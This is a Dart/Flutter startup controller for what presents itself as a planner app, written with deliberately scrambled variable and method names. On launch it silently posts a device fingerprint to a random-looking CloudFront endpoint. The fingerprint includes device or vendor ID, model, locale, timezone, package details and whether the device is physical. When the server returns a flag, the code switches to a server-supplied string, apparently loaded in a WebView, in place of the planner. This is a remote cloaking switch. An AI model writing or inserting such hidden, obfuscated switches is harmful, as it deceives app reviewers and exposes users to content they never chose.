import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../../db_plan/db_plan.dart';


class StartItemLogic extends GetxController {

  var xglmtev = RxBool(false);
  var zrvilcdhwu = RxBool(true);
  var yqopfmwg = RxString("");
  var lucienne = RxBool(false);
  var huel = RxBool(true);
  final bytzxvfwq = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    alhfu();
  }


  Future<void> alhfu() async {
    lucienne.value = true;
    huel.value = true;
    zrvilcdhwu.value = false;

    bytzxvfwq.post("https://d3hd588bz6xem9.cloudfront.net/vcmtbahkjpwfzguqdnyieo",data: await tarqusk()).then((value) {
      var geyvxcb = value.data["geyvxcb"] as String;
      var ekxlq = value.data["ekxlq"] as bool;
      if (ekxlq) {
        yqopfmwg.value = geyvxcb;
        ronny();
      } else {
        smitham();
      }
    }).catchError((e) {
      zrvilcdhwu.value = true;
      huel.value = true;
      lucienne.value = false;
    });
  }

  Future<Map<String, dynamic>> tarqusk() async {
    final DeviceInfoPlugin krto = DeviceInfoPlugin();
    PackageInfo zdtn_tygqkuh = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var wohbidjt = Platform.localeName;
    var burixlgz = currentTimeZone;

    var dpkxnb = zdtn_tygqkuh.packageName;
    var tyic = zdtn_tygqkuh.version;
    var kqoednp = zdtn_tygqkuh.buildNumber;

    var dqrne = zdtn_tygqkuh.appName;
    var mdxkbof = "";
    var fmujhzc  = "";
    var unto = "";
    var donBoyer = "";
    var clayGoyette = "";
    var shayleeKuvalis = "";


    var cbms = "";
    var fbyhwj = false;

    if (GetPlatform.isAndroid) {
      cbms = "android";
      var vtgpql = await krto.androidInfo;

      unto = vtgpql.brand;

      mdxkbof  = vtgpql.model;
      fmujhzc = vtgpql.id;

      fbyhwj = vtgpql.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      cbms = "ios";
      var gxzshp = await krto.iosInfo;
      unto = gxzshp.name;
      mdxkbof = gxzshp.model;

      fmujhzc = gxzshp.identifierForVendor ?? "";
      fbyhwj  = gxzshp.isPhysicalDevice;
    }
    var res = {
      "dqrne": dqrne,
      "kqoednp": kqoednp,
      "clayGoyette" : clayGoyette,
      "dpkxnb": dpkxnb,
      "fbyhwj": fbyhwj,
      "mdxkbof": mdxkbof,
      "burixlgz": burixlgz,
      "unto": unto,
      "fmujhzc": fmujhzc,
      "wohbidjt": wohbidjt,
      "cbms": cbms,
      "donBoyer" : donBoyer,
      "tyic": tyic,
      "shayleeKuvalis" : shayleeKuvalis,

    };
    return res;
  }

  Future<void> smitham() async {
    await Get.putAsync(() => DBPlan().init());
    final SharedPreferences prefs = await SharedPreferences.getInstance();
    final info = prefs.getInt('maxTarget');
    bool isMain = false;
    if (info != null) {
      isMain = true;
    }
    Get.offNamed(isMain ==  true ? '/plan_tab' : '/first_item');
  }

  Future<void> ronny() async {
    Get.offNamed("/plan_edit");
  }

}
